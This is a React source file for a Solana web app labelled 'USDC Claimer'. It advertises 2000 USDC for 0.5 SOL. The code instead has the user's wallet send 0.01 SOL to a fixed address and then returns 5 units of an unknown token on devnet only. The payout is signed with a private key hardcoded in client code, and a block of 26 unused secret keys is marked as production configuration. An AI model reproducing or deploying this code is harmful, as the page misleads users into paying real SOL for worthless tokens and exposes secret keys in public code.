/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "u5vCzwcJHvSrhJCRr4Giir5fTV4yULtTTS6dH1VCAZoovY1n1fKKPwkYEuuUXusP7W9oUhVXPj5sgGcgxQkL3fu"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "55vteF4wv27Kz2bhxQWYGSgphhqPDuPttSEnwQyQxuB3KX2iwMD1kqrC1Becp4Shz1KzHdxJH6ibWC15VnAjSuSw",
  "key1": "3QgVhuYFqJiTMXhJuBcjWQbaEqLf85SN1isPxy9YcigWhD2wzZxKuvw3GGYx8Y4EehY9UMxosaZYqvKYYy115sik",
  "key2": "5DMas33w4TYQATvXsENyjzJCs1NCyvFjfkiXX2WJimEeipDbkYD8ygVb7JnwBmfRxrFLdYLwbSNmEtQQgBvCB2wE",
  "key3": "37niZh3V8uSFcw9H674tMcL6MLtiiNBJVyy1sN5UwJibMK42V1oyFjidW3CMz3fz3GcL4Jw6rUJJHL9a931KYZCn",
  "key4": "2hj2KEUocC3P2AZoyMbmnajk8RYtp9VteR3twz6o9sAP9KWS3T8uTfMD6d7odfc8Nrzmfgji4diCGsbdnUjnbXy8",
  "key5": "4kBYrEE7oF8TUzUzpeUU9To7AkgkrMH1WJakW674giC6u83L2wu1e36gZpxfLJMtttJh3WYNcZgi21AZuVFRv2Cr",
  "key6": "4qvE5gPTGXUf97Tj8LD1eE3Tmq3uv8fLBeHK14U1yNdGSt2bB4vv9CkepanuHW6gtW1mrXhprzFphE5KBmVWKmgA",
  "key7": "vNrbySTGXyqqmMSvDuXeo1WZM5oroMixbAbeKwq2A88UJuPerZgQk2waGf4yZzd6dupUbUpVqWuDMPWu8fDriRb",
  "key8": "2qZwLssHpRvS4Tj8oLTxQWFbotJvoGdTzsa8yELtyzjGrntJqNEvZxiS2ZgdGx1AQZuVK4DrQ6zLY4JNCvrBfE23",
  "key9": "fMLWRJvgEvReTvPwfZc991AXbEkkZhPEzSeKBjVMfRSFgBK2aCt7jdXZ8YUVr7jUbYvXQCrgbDRkcqAc9cdW2tL",
  "key10": "3GB4NnePazTwL8dLKUQhsGCav4h8XN7EMf3oFw33YB4w1VDrW3skLjeNBSXsRp4y5W4AjGCXKVqvU9XVcoo7BKkL",
  "key11": "67YNnMvJzw6WRHiSHtqvRhTEYfDU628EbiqJ4X8gRZFNLqbVazw8rPpPujfe48pCRxNFkBWcn6xfBt2mDmm7eCxy",
  "key12": "3CzJ2ymAbUknHRCoNJG2r6F4FdDJFvsYwGD1VdpnkDz9fCMVP96Hd6eXmBmHC6sdSCjyHhVWMbGt6y1CSVqRALYi",
  "key13": "61qbnGtM149SpuMb3eAvsdo5R9aWGobSyKzBpwrpuBrvwc5VKNjbkAqrrnEhnyKDBg5HdxgTVBhuYqSziRdQvzQd",
  "key14": "2gNwqqUZ2Y2JQox9uaPCXFrhhcE7az8XXbFxxPRUjiZzfG2f8xXv2ky3Zzm1NF3hjNeMj2kk5Wryf9g8oxY4Qq93",
  "key15": "38coayS7Q4bRZpNcvzPZYuXqvZNqLukPjkCrQHHYiFXDU2wSGgYhvQFupWVSCfK3dvGDN61uQcDgkxcXVya12P3x",
  "key16": "2MQqdp13GwZnVbVLZDVG4vamh3BimzgCJqciupBqWWa8Yk1WfMJEQ9GWDtL3ahX6wZ58RDakvnyKDCoCyUCw9wPY",
  "key17": "4mwVn5yxXmJmmXEb3Qgcp9JU8nkqvR2HKpA7YTGKwFUd2WxtF2VNdSPw2NQQBFaHjjuvuL6gumCNqEFkx6obCrD5",
  "key18": "4rqe9tS9Xused6VU9jYFujyNLHSG6apwvqFjxEckdsRA3QGLmhEJKZhqnQaW74JommL6Zb8r9QDec7qheeH4cuF8",
  "key19": "55PTH3gsgpyX6psXRLSYFHACczQkqwhVXkJkbVPRQKR5iQJ3Vz5kW4cz9bfMAf6di9vbvYZxyWmKZ6aeSx4i6xuG",
  "key20": "2dh5x4EjeaVKLmS5e3LpfyVTnc235GviSP1aYX3jX54iVHDWV7QN154qqfPxNTB61BuWpwhap2SpmA1gsCxfrTyA",
  "key21": "2DQbxLS23ZVHK1XxoiJyiyB36kRU23o2EJYxNZoJPvFyKF1LSmhJDXiSYM9k734qRvVNdXNx6Hr2jtNK2byTWytR",
  "key22": "2JHEnCyEF7e2CMCLxqEcN8gP3tMCUUYmPg6sEwQp6b1fpiKQVEucDJD9cMyPRYqm3LD3pvGhDu3ZKfY2KKouXiLa",
  "key23": "59NTN5THaFdpifa7b8ZpBVYtrWvY6pVB7K2Rcf8AS4ZkSzHMHtgDzaE8NjPX81zJzZqRYJNN8rCxWC7e9KJco8Hz",
  "key24": "pmejwjYbZ4bmA649Byrm5aErMrNABzMQUrQDeTSvXoZk7Niprixcc1BU8SkFDzC3d1qVHsZ1xbZKnQNHy7jCGKF",
  "key25": "5dZafRQHPRyy2h3pNHDuYfpCH5BBzNTiftRJDWnU9dYSSe4DjBad5nLjztskEJmyF2MBLzrTmPYDxFUtACusaKjr"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
